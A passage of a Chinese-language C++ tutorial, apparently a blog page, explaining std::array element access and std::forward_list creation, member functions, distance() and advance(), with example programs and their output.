class="hljs-comment">//初始化 values 容器为 &#123;0,1,2,3&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; values.size(); i++) &#123;<br>        values.at(i) = i;<br>    &#125;<br>    <span class="hljs-comment">//使用 get() 重载函数输出指定位置元素</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; get&lt;<span class="hljs-number">3</span>&gt;(values) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//如果容器不为空，则输出容器中所有的元素</span><br>    <span class="hljs-keyword">if</span> (!values.empty()) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> val = values.begin(); val &lt; values.end(); val++) &#123;<span class="hljs-comment">//auto 关键字，可以使编译器自动判定变量的类型。</span><br>            <span class="hljs-built_in">cout</span> &lt;&lt; *val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span><br><span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><hr><p>当 array 容器创建完成之后，最常做的操作就是获取其中的元素，甚至有时还会通过循环结构获取多个元素。</p><h5 id="访问元素"><a href="#访问元素" class="headerlink" title="访问元素"></a>访问元素</h5><blockquote><p><strong>1.访问array容器中单个元素</strong></p></blockquote><p>可以通过容器名[]的方式直接访问和使用容器中的元素，这和 C++ 标准数组访问元素的方式相同，比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">values[<span class="hljs-number">4</span>] = values[<span class="hljs-number">3</span>] + <span class="hljs-number">2.0</span>*values[<span class="hljs-number">1</span>];<br></code></pre></div></td></tr></table></figure><p>第 5 个元素的值被赋值为右边表达式的值。需要注意的是，使用如上这样方式，由于没有做任何边界检查，所以即便使用越界的索引值去访问或存储元素，也不会被检测到。</p><p>为了能够有效地避免越界访问的情况，可以使用 array 容器提供的 at() 成员函数，例如 :</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">values.at (<span class="hljs-number">4</span>) = values.at(<span class="hljs-number">3</span>) + <span class="hljs-number">2.0</span>*values.at(<span class="hljs-number">1</span>);<br></code></pre></div></td></tr></table></figure><p>和前一行语句实现的功能相同，其次当传给 at() 的索引是一个越界值时，程序会抛出 std::out_of_range 异常。因此当需要访问容器中某个指定元素时，建议大家使用 at()，除非确定索引没有越界。</p><blockquote><p>为什么 array 容器在重载 [] 运算符时，没有实现边界检查的功能呢？<br>因为性能。如果每次访问元素，都去检查索引值，无疑会产生很多开销。当不存在越界访问的可能时，就能避免这种开销。</p></blockquote><p>除此之外，array 容器还提供了 get<n> 模板函数，它是一个辅助函数，能够获取到容器的第 n 个元素。需要注意的是，该模板函数中，参数的实参必须是一个在编译时可以确定的常量表达式，所以它不能是一个循环变量。也就是说，它只能访问模板参数指定的元素，编译器在编译时会对它进行检查。</p><p>使用 get<n> 模板函数代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-built_in">string</span>, 5&gt; words&#123; <span class="hljs-string">&quot;one&quot;</span>,<span class="hljs-string">&quot;two&quot;</span>,<span class="hljs-string">&quot;three&quot;</span>,<span class="hljs-string">&quot;four&quot;</span>,<span class="hljs-string">&quot;five&quot;</span> &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; get&lt;<span class="hljs-number">3</span>&gt;(words) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// Output words[3]</span><br>    <span class="hljs-comment">//cout &lt;&lt; get&lt;6&gt;(words) &lt;&lt; std::endl; //越界，会发生编译错误</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//运行结果</span><br>four<br></code></pre></div></td></tr></table></figure><p>另外，array 容器提供了 data() 成员函数，通过调用该函数可以得到指向容器首个元素的指针。通过该指针，我们可以获得容器中的各个元素，例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt; words&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; *( words.data()+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//运行结果</span><br><span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>2.访问array容器中多个元素</strong></p></blockquote><p>array 容器提供的 size() 函数能够返回容器中元素的个数（函数返回值为 size_t 类型），例子：计算求和：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">double</span> total = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span> ; i &lt; values.size() ; ++i)<br>&#123;<br>    total += values[i];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>size() 函数的存在，为 array 容器提供了标准数组所没有的优势，即能够知道它包含多少元素。</p><p>并且，接受数组容器作为参数的函数，只需要通过调用容器的成员函数 size()，就能得到元素的个数。除此之外，通过调用 array 容器的 empty() 成员函数，即可知道容器中有没有元素（如果容器中没有元素，此函数返回 true），如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(values.empty())<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;The container has no elements.\n&quot;</span>;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;The container has &quot;</span>&lt;&lt; values.size()&lt;&lt;<span class="hljs-string">&quot;elements.\n&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>然而，很少会创建空的 array 容器，因为当生成一个 array 容器时，它的元素个数就固定了，而且无法改变，所以生成空 array 容器的唯一方法是将模板的第二个参数指定为 0，但这种情况基本不可能发生。</p><blockquote><p>array 容器之所以提供 empty() 成员函数的原因，对于其他元素可变或者元素可删除的容器（例如 vector、deque 等）来说，它们使用 empty() 时的机制是一样的，因此为它们提供了一个一致性的操作。</p></blockquote><p>除了借助 size() 外，对于任何可以使用迭代器的容器，都可以使用基于范围的循环，因此能够更加简便地计算容器中所有元素的和，比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">double</span> total = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;&amp; value : values)<br>    total += value;<br></code></pre></div></td></tr></table></figure><p>综合案例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iomanip&gt; </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt; values1;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt; values2;<br>    <span class="hljs-comment">//初始化 values1 为 &#123;0,1,2,3,4&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; values1.size(); ++i)<br>    &#123;<br>        values1.at(i) = i;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;values1[0] is : &quot;</span> &lt;&lt; values1[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;values1[1] is : &quot;</span> &lt;&lt; values1.at(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;values1[2] is : &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">2</span>&gt;(values1) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//初始化 values2 为&#123;10，11，12，13，14&#125;</span><br>    <span class="hljs-keyword">int</span> initvalue = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; value : values2)<br>    &#123;<br>        value = initvalue;<br>        initvalue++;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt;  <span class="hljs-string">&quot;Values1 is : &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = values1.begin(); i &lt; values1.end(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span> &lt;&lt; <span class="hljs-string">&quot;Values2 is : &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = values2.begin(); i &lt; values2.end(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//运行结果</span><br>values1[<span class="hljs-number">0</span>] is : <span class="hljs-number">0</span><br>values1[<span class="hljs-number">1</span>] is : <span class="hljs-number">1</span><br>values1[<span class="hljs-number">2</span>] is : <span class="hljs-number">2</span><br>Values1 is : <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>Values2 is : <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">12</span> <span class="hljs-number">13</span> <span class="hljs-number">14</span><br></code></pre></div></td></tr></table></figure><h4 id="2-forward-list容器"><a href="#2-forward-list容器" class="headerlink" title="2.forward_list容器"></a>2.forward_list容器</h4><p>forward_list 是 C++ 11 新添加的一类容器，其底层实现和 list 容器一样，采用的也是链表结构，只不过 forward_list 使用的是单链表，而 list 使用的是双向链表。<br>使用链表存储数据最大的特点在于，其并不会将数据进行集中存储（向数组那样），换句话说，链表中数据的存储位置是分散的、随机的，整个链表中数据的线性关系通过指针来维持。</p><p>forward_list 容器具有和 list 容器相同的特性，即擅长在序列的任何位置进行插入元素或删除元素的操作，但对于访问存储的元素，没有其它容器（如 array、vector）的效率高。<br>由于单链表没有双向链表那样灵活，因此相比 list 容器，forward_list 容器的功能受到了很多限制。比如，由于单链表只能从前向后遍历，而不支持反向遍历，因此 forward_list 容器只提供前向迭代器，而不是双向迭代器。这意味着，forward_list 容器不具有 rbegin()、rend() 之类的成员函数。</p><blockquote><p>既然 forward_list 容器具有和 list 容器相同的特性，list 容器还可以提供更多的功能函数，forward_list 容器有什么存在的必要呢？<br>虽然forward_list 容器底层使用单链表，也不是一无是处。比如，存储相同个数的同类型元素，单链表耗用的内存空间更少，空间利用率更高，并且对于实现某些操作单链表的执行效率也更高。<br>效率高是选用 forward_list 而弃用 list 容器最主要的原因，换句话说，只要是 list 容器和 forward_list 容器都能实现的操作，应优先选择 forward_list 容器。</p></blockquote><h5 id="1-forward-list容器的创建"><a href="#1-forward-list容器的创建" class="headerlink" title="1.forward_list容器的创建"></a>1.forward_list容器的创建</h5><p>由于 forward_list 容器以模板类 forward_list<T>（T 为存储元素的类型）的形式被包含在<forward_list>头文件中，并定义在 std 命名空间中。std 命名空间也可以在使用 forward_list 容器时额外注明，两种方式都可以。</p><blockquote><p><strong>1.创建一个没有任何元素的空 forward_list 容器：</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; values;<span class="hljs-comment">//由于 forward_list 容器在创建后也可以添加元素，因此这种创建方式很常见。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>2.创建一个包含 n 个元素的 forward_list 容器：</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">values</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<span class="hljs-comment">//通过此方式创建 values 容器，其中包含 10 个元素，每个元素的值都为相应类型的默认值（int类型的默认值为 0）。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>3.创建一个包含 n 个元素的 forward_list 容器，并为每个元素指定初始值。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">values</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>)</span></span>;<span class="hljs-comment">//创建了一个包含 10 个元素并且值都为 5 个 values 容器。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>4.在已有 forward_list 容器的情况下，通过拷贝该容器可以创建新的 forward_list 容器。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">value1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">value2</span><span class="hljs-params">(value1)</span></span>;<br><span class="hljs-comment">//采用此方式，必须保证新旧容器存储的元素类型一致。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>5.通过拷贝其他类型容器（或者普通数组）中指定区域内的元素，可以创建新的 forward_list 容器。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//拷贝普通数组，创建forward_list容器</span><br><span class="hljs-keyword">int</span> a[] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> &#125;;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">values</span><span class="hljs-params">(a, a+<span class="hljs-number">5</span>)</span></span>;<br><span class="hljs-comment">//拷贝其它类型的容器，创建forward_list容器</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt;arr&#123; <span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span> &#125;;<br><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt;values(arr.begin()+<span class="hljs-number">2</span>, arr.end());<span class="hljs-comment">//拷贝arr容器中的&#123;13,14,15&#125;</span><br></code></pre></div></td></tr></table></figure><h5 id="2-forward-list容器支持的成员函数"><a href="#2-forward-list容器支持的成员函数" class="headerlink" title="2.forward_list容器支持的成员函数"></a>2.forward_list容器支持的成员函数</h5><table><thead><tr><th>成员函数</th><th>功能</th></tr></thead><tbody><tr><td>before_begin()</td><td>返回一个前向迭代器，其指向容器中第一个元素之前的位置。</td></tr><tr><td>begin()</td><td>返回一个前向迭代器，其指向容器中第一个元素的位置。</td></tr><tr><td>end()</td><td>返回一个前向迭代器，其指向容器中最后一个元素之后的位置。</td></tr><tr><td>cbefore_begin()</td><td>和 before_begin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>empty()</td><td>判断容器中是否有元素，若无元素，则返回 true；反之，返回 false。</td></tr><tr><td>max_size()</td><td>返回容器所能包含元素个数的最大值。这通常是一个很大的值，一般是 232-1，所以我们很少会用到这个函数。</td></tr><tr><td>front()</td><td>返回第一个元素的引用。</td></tr><tr><td>assign()</td><td>用新元素替换容器中原有内容。</td></tr><tr><td>push_front()</td><td>在容器头部插入一个元素。</td></tr><tr><td>emplace_front()</td><td>在容器头部生成一个元素。该函数和 push_front() 的功能相同，但效率更高。</td></tr><tr><td>pop_front()</td><td>删除容器头部的一个元素。</td></tr><tr><td>emplace_after()</td><td>在指定位置之后插入一个新元素，并返回一个指向新元素的迭代器。和 insert_after() 的功能相同，但效率更高。</td></tr><tr><td>insert_after()</td><td>在指定位置之后插入一个新元素，并返回一个指向新元素的迭代器。</td></tr><tr><td>erase_after()</td><td>删除容器中某个指定位置或区域内的所有元素。</td></tr><tr><td>swap()</td><td>交换两个容器中的元素，必须保证这两个容器中存储的元素类型是相同的。</td></tr><tr><td>resize()</td><td>调整容器的大小。</td></tr><tr><td>clear()</td><td>删除容器存储的所有元素。</td></tr><tr><td>splice_after()</td><td>将某个 forward_list 容器中指定位置或区域内的元素插入到另一个容器的指定位置之后。</td></tr><tr><td>remove(val)</td><td>删除容器中所有等于 val 的元素。</td></tr><tr><td>remove_if()</td><td>删除容器中满足条件的元素。</td></tr><tr><td>unique()</td><td>删除容器中相邻的重复元素，只保留一个。</td></tr><tr><td>merge()</td><td>合并两个事先已排好序的 forward_list 容器，并且合并之后的 forward_list 容器依然是有序的。</td></tr><tr><td>sort()</td><td>通过更改容器中元素的位置，将它们进行排序。</td></tr><tr><td>reverse()</td><td>反转容器中元素的顺序。</td></tr></tbody></table><p>除此之外，C++ 11 标准库还新增加了 begin() 和 end() 这 2 个函数，和 forward_list 容器包含的 begin() 和 end() 成员函数不同，标准库提供的这 2 个函数的操作对象，既可以是容器，还可以是普通数组。当操作对象是容器时，它和容器包含的 begin() 和 end() 成员函数的功能完全相同；如果操作对象是普通数组，则 begin() 函数返回的是指向数组第一个元素的指针，同样 end() 返回指向数组中最后一个元素之后一个位置的指针（注意不是最后一个元素）。</p><p>forward_list 容器还有一个std::swap(x , y)非成员函数（其中 x 和 y 是存储相同类型元素的 forward_list 容器），它和 swap() 成员函数的功能完全相同，仅使用语法上有差异。</p><p>部分成员函数案例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;forward_list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; values&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>    values.emplace_front(<span class="hljs-number">4</span>);<span class="hljs-comment">//&#123;4,1,2,3&#125;</span><br>    values.emplace_after(values.before_begin(), <span class="hljs-number">5</span>); <span class="hljs-comment">//&#123;5,4,1,2,3&#125;</span><br>    values.reverse();<span class="hljs-comment">//&#123;3,2,1,4,5&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = values.begin(); it != values.end(); ++it) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//结果输出</span><br><span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>因为forward_list 容器中是不提供 size() 函数的，但如果想要获取 forward_list 容器中存储元素的个数，可以使用头文件 <iterator> 中的 distance() 函数。例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;forward_list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iterator&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; my_words&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-built_in">std</span>::distance(<span class="hljs-built_in">std</span>::begin(my_words), <span class="hljs-built_in">std</span>::end(my_words));<br>    <span class="hljs-built_in">cout</span> &lt;&lt; count;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>并且，forward_list 容器迭代器的移动除了使用 ++ 运算符单步移动，还能使用 advance() 函数，比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;forward_list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; values&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-keyword">auto</span> it = values.begin();<br>    advance(it, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">while</span> (it!=values.end())<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        ++it;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="二-无序关联式容器"><a href="#二-无序关联式容器" class="headerlink" title="二.无序关联式容器"></a>二.无序关联式容器</h3><p>除了序列式容器和关联式容器之外，C++ 11 